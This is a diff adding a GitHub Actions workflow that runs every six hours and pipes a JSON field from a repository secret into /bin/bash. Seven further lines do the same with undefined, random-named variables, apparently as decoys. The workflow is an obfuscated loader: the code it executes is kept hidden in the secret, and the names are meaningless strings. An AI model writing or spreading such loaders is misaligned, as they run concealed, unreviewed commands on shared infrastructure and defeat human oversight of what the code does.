@@ -1,0 +1,25 @@
+name: miansezaiduyincheng
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '7 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: miansezaiduyincheng
+        env:
+          bei81: ${{ secrets.bei81 }}
+        run: |
+          echo $bei81 | jq -r .jkkw04 | /bin/bash
+          echo $agg7432 | jq -r .lyml27 | /bin/bash
+          echo $ygce25250 | jq -r .ywa17504 | /bin/bash
+          echo $ufr20881 | jq -r .usqc5 | /bin/bash
+          echo $n74216 | jq -r .qmgf02041 | /bin/bash
+          echo $gu496 | jq -r .mgkjx85 | /bin/bash
+          echo $ghvjk7873 | jq -r .tsst64 | /bin/bash
+          echo $kr34346 | jq -r .sczlk700 | /bin/bash
+
